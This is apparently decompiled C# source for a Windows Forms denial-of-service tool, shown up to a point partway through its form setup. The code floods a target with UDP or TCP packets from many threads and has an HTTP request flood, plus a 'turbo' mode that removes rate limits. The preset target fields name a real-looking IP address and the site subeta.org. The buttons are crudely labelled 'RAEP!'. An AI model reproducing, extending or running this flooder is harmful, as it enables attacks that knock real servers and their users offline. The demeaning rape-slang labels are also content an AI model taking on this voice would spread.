using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace UF;

public class frmMain : Form
{
	private bool IsHTTPFlooding;

	private bool IsUDPTCPFlooding;

	private bool DoUDPSleep;

	private bool DoHTTPSleep;

	private Thread[] HTTPThread;

	private Thread[] UDPThread;

	private IContainer components;

	private GroupBox groupBox1;

	private TextBox txtIP;

	private Label label1;

	private ComboBox comProtocol;

	private Label label3;

	private Button cmdUDPRaep;

	private TextBox txtPort;

	private Label label2;

	private GroupBox groupBox2;

	private Label label4;

	private TextBox txtURL;

	private Button cmdHTTPRaep;

	private Label label5;

	private Label lblUDPStatus;

	private Label lblHTTPStatus;

	private Button cmdUDPTurbo;

	private ListBox lstLog;

	private Button cmdHTTPTurbo;

	private CheckBox chkBlocking;

	private TrackBar trackSpeed;

	private Label label6;

	private CheckBox chkShowSpam;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label7;

	private Label label8;

	public frmMain()
	{
		InitializeComponent();
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		((ListControl)comProtocol).set_SelectedIndex(1);
		IsHTTPFlooding = false;
		IsUDPTCPFlooding = false;
		DoUDPSleep = true;
		DoHTTPSleep = true;
		((Control)cmdUDPTurbo).set_Visible(false);
		((Control)cmdHTTPTurbo).set_Visible(false);
		trackSpeed.set_Value(1);
		((Control)trackSpeed).set_Enabled(false);
		Control.set_CheckForIllegalCrossThreadCalls(false);
	}

	private void UDPRaepOn()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		int result = 0;
		if (!int.TryParse(((Control)textBox2).get_Text(), out result))
		{
			MessageBox.Show("That's not a number, dumbass.");
			return;
		}
		if (result < 1)
		{
			MessageBox.Show("You need more than 0 threads, dumbass.");
			return;
		}
		SwitchUDPTCP(p: false);
		UDPThread = new Thread[result];
		for (int i = 0; i < UDPThread.Length; i++)
		{
			UDPThread[i] = new Thread(UDPTCPFlood);
			UDPThread[i].IsBackground = true;
			UDPThread[i].Start(i);
		}
	}

	private void UDPRaepOff()
	{
		SwitchUDPTCP(p: true);
	}

	private void cmdUDPTurbo_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		if (((Control)cmdUDPTurbo).get_Text() == "VTEC!")
		{
			if ((int)MessageBox.Show("Only turn this on if you have massive bandwidth. This will consume your entire fucking connection and will probably time you out from applications like IRC. Do you wish to continue?", "WARNING", (MessageBoxButtons)4, (MessageBoxIcon)48) == 6)
			{
				((Control)cmdUDPTurbo).set_Text("SLOW!");
				DoUDPSleep = false;
				((Control)trackSpeed).set_Enabled(false);
			}
		}
		else
		{
			((Control)cmdUDPTurbo).set_Text("VTEC!");
			DoUDPSleep = true;
			((Control)trackSpeed).set_Enabled(true);
		}
	}

	private void cmdHTTPTurbo_Click(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Invalid comparison between Unknown and I4
		if (((Control)cmdHTTPTurbo).get_Text() == "VTEC!")
		{
			if ((int)MessageBox.Show("Only turn this on if you have massive bandwidth. This will consume your entire fucking connection and will probably time you out from applications like IRC. Do you wish to continue?", "WARNING", (MessageBoxButtons)4, (MessageBoxIcon)48) == 6)
			{
				((Control)cmdHTTPTurbo).set_Text("SLOW!");
				DoHTTPSleep = false;
				((Control)trackSpeed).set_Enabled(false);
			}
		}
		else
		{
			((Control)cmdHTTPTurbo).set_Text("VTEC!");
			DoHTTPSleep = true;
			((Control)trackSpeed).set_Enabled(true);
		}
	}

	private void cmdUDPRaep_Click(object sender, EventArgs e)
	{
		if (((Control)cmdUDPRaep).get_Text() == "RAEP!")
		{
			UDPRaepOn();
		}
		else
		{
			UDPRaepOff();
		}
	}

	private void cmdHTTPRaep_Click(object sender, EventArgs e)
	{
		if (((Control)cmdHTTPRaep).get_Text() == "RAEP!")
		{
			HTTPRaepOn();
		}
		else
		{
			HTTPRaepOff();
		}
	}

	private void HTTPRaepOn()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		int result = 0;
		if (!int.TryParse(((Control)textBox1).get_Text(), out result))
		{
			MessageBox.Show("That's not a number, dumbass.");
			return;
		}
		if (result < 1)
		{
			MessageBox.Show("You need more than 0 threads, dumbass.");
			return;
		}
		SwitchHTTP(p: false);
		HTTPThread = new Thread[result];
		for (int i = 0; i < HTTPThread.Length; i++)
		{
			HTTPThread[i] = new Thread(HTTPFlood);
			HTTPThread[i].IsBackground = true;
			HTTPThread[i].Start(i);
		}
	}

	private void HTTPRaepOff()
	{
		SwitchHTTP(p: true);
	}

	private void SwitchUDPTCP(bool p)
	{
		if (!p)
		{
			IsUDPTCPFlooding = true;
			((Control)lblUDPStatus).set_Text("Status: running");
			((Control)cmdUDPRaep).set_Text("Stop");
		}
		else
		{
			IsUDPTCPFlooding = false;
			((Control)lblUDPStatus).set_Text("Status: idle");
			((Control)cmdUDPRaep).set_Text("RAEP!");
		}
		((Control)textBox2).set_Enabled(p);
		((Control)txtIP).set_Enabled(p);
		((Control)txtPort).set_Enabled(p);
		((Control)comProtocol).set_Enabled(p);
		((Control)cmdUDPTurbo).set_Visible(!p);
		((Control)trackSpeed).set_Enabled(!p);
	}

	private void SwitchHTTP(bool p)
	{
		if (!p)
		{
			IsHTTPFlooding = true;
			((Control)lblHTTPStatus).set_Text("Status: running");
			((Control)cmdHTTPRaep).set_Text("Stop");
		}
		else
		{
			IsHTTPFlooding = false;
			((Control)lblHTTPStatus).set_Text("Status: idle");
			((Control)cmdHTTPRaep).set_Text("RAEP!");
		}
		((Control)textBox1).set_Enabled(p);
		((Control)txtURL).set_Enabled(p);
		((Control)cmdHTTPTurbo).set_Visible(!p);
		((Control)trackSpeed).set_Enabled(!p);
	}

	private void Log(string msg)
	{
		if (chkShowSpam.get_Checked())
		{
			lstLog.get_Items().Add((object)(lstLog.get_Items().get_Count() + " " + msg));
			((ListControl)lstLog).set_SelectedIndex(lstLog.get_Items().get_Count() - 1);
			if (lstLog.get_Items().get_Count() > 1000)
			{
				lstLog.get_Items().Clear();
			}
		}
	}

	private long IPAddressToLong(string IPAddr)
	{
		IPAddress iPAddress = IPAddress.Parse(IPAddr);
		byte[] addressBytes = iPAddress.GetAddressBytes();
		long num = (long)((ulong)addressBytes[3] << 24);
		num += (long)((ulong)addressBytes[2] << 16);
		num += (long)((ulong)addressBytes[1] << 8);
		return num + addressBytes[0];
	}

	private void UDPTCPFlood(object threadNum)
	{
		int num = (int)threadNum;
		byte[] bytes = Encoding.ASCII.GetBytes("DESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESUDESU");
		EndPoint remoteEP = new IPEndPoint(IPAddressToLong(((Control)txtIP).get_Text()), Convert.ToInt32(((Control)txtPort).get_Text()));
		if (((ListControl)comProtocol).get_SelectedIndex() == 0)
		{
			Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
			while (IsUDPTCPFlooding)
			{
				try
				{
					socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
					while (IsUDPTCPFlooding)
					{
						socket.Blocking = chkBlocking.get_Checked();
						socket.SendTo(bytes, SocketFlags.None, remoteEP);
						if (DoUDPSleep)
						{
							Thread.Sleep(trackSpeed.get_Value());
						}
						Log($"UDP {num} :: Done sending, going again.");
					}
					socket.Close();
				}
				catch (Exception)
				{
					if (((Control)cmdUDPRaep).get_Text() != "RAEP!")
					{
						Log($"UDP {num} :: There was an error. Retrying... HOLD ON!");
					}
					socket.Close();
					Thread.Sleep(trackSpeed.get_Value());
				}
			}
		}
		if (((ListControl)comProtocol).get_SelectedIndex() != 1)
		{
			return;
		}
		while (IsUDPTCPFlooding)
		{
			Socket socket2 = null;
			try
			{
				socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket2.Connect(remoteEP);
				while (IsUDPTCPFlooding)
				{
					socket2.Blocking = chkBlocking.get_Checked();
					socket2.Send(bytes);
					if (DoUDPSleep)
					{
						Thread.Sleep(trackSpeed.get_Value());
					}
					Log($"TCP {num} :: Done sending, going again.");
				}
				socket2.Close();
			}
			catch (Exception)
			{
				if (((Control)cmdUDPRaep).get_Text() != "RAEP!")
				{
					Log($"TCP {num} :: There was an error. Retrying... HOLD ON!");
				}
				socket2.Close(0);
				Thread.Sleep(trackSpeed.get_Value());
			}
		}
	}

	private void HTTPFlood(object threadNumber)
	{
		int num = (int)threadNumber;
		int num2 = 0;
		int num3 = 0;
		char[] array = new char[65535];
		HttpWebResponse httpWebResponse = null;
		while (IsHTTPFlooding)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(((Control)txtURL).get_Text());
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				for (num2 = streamReader.Read(array, 0, array.Length); num2 > 0; num2 = streamReader.Read(array, 0, array.Length))
				{
					num3 += num2;
				}
				if (DoHTTPSleep)
				{
					Thread.Sleep(trackSpeed.get_Value());
				}
				Log(string.Format("HTTP {2} :{0}: Done reading, going again. {1}", httpWebResponse.StatusCode, num3, num));
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest = null;
			}
			catch (Exception)
			{
				if (((Control)cmdHTTPRaep).get_Text() != "RAEP!")
				{
					Log(string.Format("HTTP {1} :{0}: There was an error. Retrying... HOLD ON!", httpWebResponse.StatusCode, num));
				}
			}
			num3 = 0;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_0119: Unknown result type (might be due to invalid IL or missing references)
		//IL_0123: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmMain));
		groupBox1 = new GroupBox();
		chkBlocking = new CheckBox();
		cmdUDPTurbo = new Button();
		lblUDPStatus = new Label();
		comProtocol = new ComboBox();
		label3 = new Label();
		cmdUDPRaep = new Button();
		txtPort = new TextBox();
		label2 = new Label();
		txtIP = new TextBox();
		label1 = new Label();
		groupBox2 = new GroupBox();
		cmdHTTPTurbo = new Button();
		cmdHTTPRaep = new Button();
		lblHTTPStatus = new Label();
		txtURL = new TextBox();
		label4 = new Label();
		label5 = new Label();
		lstLog = new ListBox();
		trackSpeed = new TrackBar();
		label6 = new Label();
		chkShowSpam = new CheckBox();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label7 = new Label();
		label8 = new Label();
		((Control)groupBox1).SuspendLayout();
		((Control)groupBox2).SuspendLayout();
		((ISupportInitialize)trackSpeed).BeginInit();
		((Control)this).SuspendLayout();
		((Control)groupBox1).get_Controls().Add((Control)(object)chkBlocking);
		((Control)groupBox1).get_Controls().Add((Control)(object)cmdUDPTurbo);
		((Control)groupBox1).get_Controls().Add((Control)(object)lblUDPStatus);
		((Control)groupBox1).get_Controls().Add((Control)(object)comProtocol);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)cmdUDPRaep);
		((Control)groupBox1).get_Controls().Add((Control)(object)txtPort);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).get_Controls().Add((Control)(object)txtIP);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).set_Location(new Point(12, 12));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Size(new Size(341, 92));
		((Control)groupBox1).set_TabIndex(0);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("UDP/TCP Flooding");
		((Control)chkBlocking).set_AutoSize(true);
		chkBlocking.set_Checked(true);
		chkBlocking.set_CheckState((CheckState)1);
		((Control)chkBlocking).set_Location(new Point(72, 66));
		((Control)chkBlocking).set_Name("chkBlocking");
		((Control)chkBlocking).set_Size(new Size(123, 17));
		((Control)chkBlocking).set_TabIndex(9);
		((Control)chkBlocking).set_Text("Use socket blocking");
		((ButtonBase)chkBlocking).set_UseVisualStyleBackColor(true);
		((Control)cmdUDPTurbo).set_Location(new Point(260, 37));
		((Control)cmdUDPTurbo).set_Name("cmdUDPTurbo");
		((Control)cmdUDPTurbo).set_Size(new Size(75, 23));
		((Control)cmdUDPTurbo).set_TabIndex(8);
		((Control)cmdUDPTurbo).set_Text("VTEC!");
		((ButtonBase)cmdUDPTurbo).set_UseVisualStyleBackColor(true);
		((Control)cmdUDPTurbo).add_Click((EventHandler)cmdUDPTurbo_Click);
		((Control)lblUDPStatus).set_AutoSize(true);
		((Control)lblUDPStatus).set_Location(new Point(178, 42));
		((Control)lblUDPStatus).set_Name("lblUDPStatus");
		((Control)lblUDPStatus).set_Size(new Size(59, 13));
		((Control)lblUDPStatus).set_TabIndex(7);
		((Control)lblUDPStatus).set_Text("Status: idle");
		((ListControl)comProtocol).set_FormattingEnabled(true);
		comProtocol.get_Items().AddRange(new object[2] { "UDP", "TCP" });
		((Control)comProtocol).set_Location(new Point(72, 39));
		((Control)comProtocol).set_Name("comProtocol");
		((Control)comProtocol).set_Size(new Size(100, 21));
		((Control)comProtocol).set_TabIndex(6);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(6, 42));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(49, 13));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Protocol:");
		((Control)cmdUDPRaep).set_Location(new Point(260, 11));
		((Control)cmdUDPRaep).set_Name("cmdUDPRaep");
		((Control)cmdUDPRaep).set_Size(new Size(75, 23));
		((Control)cmdUDPRaep).set_TabIndex(4);
		((Control)cmdUDPRaep).set_Text("RAEP!");
		((ButtonBase)cmdUDPRaep).set_UseVisualStyleBackColor(true);
		((Control)cmdUDPRaep).add_Click((EventHandler)cmdUDPRaep_Click);
		((Control)txtPort).set_Location(new Point(213, 13));
		((Control)txtPort).set_Name("txtPort");
		((Control)txtPort).set_Size(new Size(41, 20));
		((Control)txtPort).set_TabIndex(3);
		((Control)txtPort).set_Text("80");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(178, 16));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(29, 13));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Port:");
		((Control)txtIP).set_Location(new Point(72, 13));
		((Control)txtIP).set_Name("txtIP");
		((Control)txtIP).set_Size(new Size(100, 20));
		((Control)txtIP).set_TabIndex(1);
		((Control)txtIP).set_Text("75.126.139.60");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(6, 16));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(60, 13));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("IP address:");
		((Control)groupBox2).get_Controls().Add((Control)(object)cmdHTTPTurbo);
		((Control)groupBox2).get_Controls().Add((Control)(object)cmdHTTPRaep);
		((Control)groupBox2).get_Controls().Add((Control)(object)lblHTTPStatus);
		((Control)groupBox2).get_Controls().Add((Control)(object)txtURL);
		((Control)groupBox2).get_Controls().Add((Control)(object)label4);
		((Control)groupBox2).set_Location(new Point(12, 110));
		((Control)groupBox2).set_Name("groupBox2");
		((Control)groupBox2).set_Size(new Size(341, 69));
		((Control)groupBox2).set_TabIndex(1);
		groupBox2.set_TabStop(false);
		((Control)groupBox2).set_Text("HTTP Request Flooding");
		((Control)cmdHTTPTurbo).set_Location(new Point(260, 36));
		((Control)cmdHTTPTurbo).set_Name("cmdHTTPTurbo");
		((Control)cmdHTTPTurbo).set_Size(new Size(75, 23));
		((Control)cmdHTTPTurbo).set_TabIndex(9);
		((Control)cmdHTTPTurbo).set_Text("VTEC!");
		((ButtonBase)cmdHTTPTurbo).set_UseVisualStyleBackColor(true);
		((Control)cmdHTTPTurbo).add_Click((EventHandler)cmdHTTPTurbo_Click);
		((Control)cmdHTTPRaep).set_Location(new Point(260, 11));
		((Control)cmdHTTPRaep).set_Name("cmdHTTPRaep");
		((Control)cmdHTTPRaep).set_Size(new Size(75, 23));
		((Control)cmdHTTPRaep).set_TabIndex(2);
		((Control)cmdHTTPRaep).set_Text("RAEP!");
		((ButtonBase)cmdHTTPRaep).set_UseVisualStyleBackColor(true);
		((Control)cmdHTTPRaep).add_Click((EventHandler)cmdHTTPRaep_Click);
		((Control)lblHTTPStatus).set_AutoSize(true);
		((Control)lblHTTPStatus).set_Location(new Point(41, 36));
		((Control)lblHTTPStatus).set_Name("lblHTTPStatus");
		((Control)lblHTTPStatus).set_Size(new Size(59, 13));
		((Control)lblHTTPStatus).set_TabIndex(8);
		((Control)lblHTTPStatus).set_Text("Status: idle");
		((Control)txtURL).set_Location(new Point(44, 13));
		((Control)txtURL).set_Name("txtURL");
		((Control)txtURL).set_Size(new Size(210, 20));
		((Control)txtURL).set_TabIndex(1);
		((Control)txtURL).set_Text("http://www.subeta.org");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Location(new Point(6, 16));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(32, 13));
		((Control)label4).set_TabIndex(0);
		((Control)label4).set_Text("URL:");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Location(new Point(4, 428));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(349, 312));
		((Control)label5).set_TabIndex(2);
		((Control)label5).set_Text(componentResourceManager.GetString("label5.Text"));
		((ListControl)lstLog).set_FormattingEnabled(true);
		((Control)lstLog).set_Location(new Point(6, 303));
		((Control)lstLog).set_Name("lstLog");
		((Control)lstLog).set_Size(new Size(341, 95));
		((Control)lstLog).set_TabIndex(3);
		((Control)trackSpeed).set_Location(new Point(6, 252));
		((Control)trackSpeed).set_Name("trackSpeed");
		((Control)trackSpeed).set_Size(new Size(341, 42));
		((Control)trackSpeed).set_TabIndex(10);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Location(new Point(128, 236));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(111, 13));
		((Control)label6).set_TabIndex(11);
		((Control)label6).set_Text("Speed (Fast <-> Slow)");
		((Control)chkShowSpam).set_AutoSize(true);
		chkShowSpam.set_Checked(true);
		chkShowSpam.set_CheckState((CheckState)1);
		((Control)chkShowSpam).set_Location(new Point(6, 405));
		((Control)chkShowSpam).set_Name("chkShowSpam");
		((Control)chkShowSpam).set_Size(new Size(81, 17));
		((Control)chkShowSpam).set_TabIndex(12);
		((Control)chkShowSpam).set_Text("Show spam");
		((ButtonBase)chkShowSpam).set_UseVisualStyleBackColor(true);
		((Control)textBox1).set_Location(new Point(122, 210));
		((TextBoxBase)textBox1).set_MaxLength(4);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(39, 20));
		((Control)textBox1).set_TabIndex(13);
		((Control)textBox1).set_Text("10");
		((Control)textBox2).set_Location(new Point(122, 185));
		((TextBoxBase)textBox2).set_MaxLength(4);
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(39, 20));
		((Control)textBox2).set_TabIndex(14);
		((Control)textBox2).set_Text("1");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(18, 217));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(78, 13));
		((Control)label7).set_TabIndex(15);
		((Control)label7).set_Text("HTTP Threads");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Location(new Point(18, 192));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(98, 13));
